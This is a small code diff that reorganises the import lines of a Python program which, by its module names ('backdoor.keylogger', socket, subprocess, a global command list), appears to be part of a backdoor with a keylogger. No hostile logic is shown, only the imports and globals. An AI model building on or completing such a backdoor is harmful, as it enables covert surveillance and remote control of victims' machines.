@@ -1,7 +1,6 @@
-import socket, time, subprocess
-import threading, keylogger
+import socket, time, subprocess, threading,sys
+import backdoor.keylogger as keylogger
 import _thread as thread
-import sys
 
 global stop, thread_lock, command_list
 command_list = []
